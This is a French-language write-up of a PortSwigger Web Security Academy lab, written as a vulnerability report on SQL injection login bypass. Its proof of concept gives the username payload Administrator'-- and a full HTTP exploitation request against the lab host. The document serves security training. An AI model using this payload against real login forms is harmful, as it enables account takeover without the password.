# 🐛 Lab : SQL injection vulnerability allowing login bypass
**Catégorie :** Injection SQL (SQLi)
**Type :** Subverting application logic
**Plateforme :** PortSwigger Web Security Academy

---

## 📄 Rapport de Vulnérabilité

### 📌 Résumé de la Vulnérabilité
Le formulaire de connexion est vulnérable à une injection SQL permettant de contourner l'authentification. L'application ne sanitize pas le champ `username`, permettant d'injecter une séquence de commentaire (`--`) pour tronquer la requête SQL et annuler la vérification du mot de passe.

### 🚨 Impact
**Niveau de criticité : Critique**
L'attaquant peut s'authentifier en tant que n'importe quel utilisateur, y compris l'administrateur, sans connaître le mot de passe. Cela permet une prise de contrôle totale du compte cible.

### 🛠️ Preuve de Concept (PoC)
1. Accéder à la page de connexion (`/login`).
2. Saisir `Administrator'--` dans le champ `username` et n'importe quelle chaîne dans `password`.
3. La requête backend devient : `SELECT * FROM users WHERE username = 'Administrator'--' AND password = '...'`
4. **Requête HTTP d'exploitation :**

```http
POST /login HTTP/2
Host: 0a2900e103c99432809580eb001b0005.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

csrf=3IFTaph0ZYA3Qez6wuU6qBvmdH1JR1hP&username=Administrator'--&password=wiw
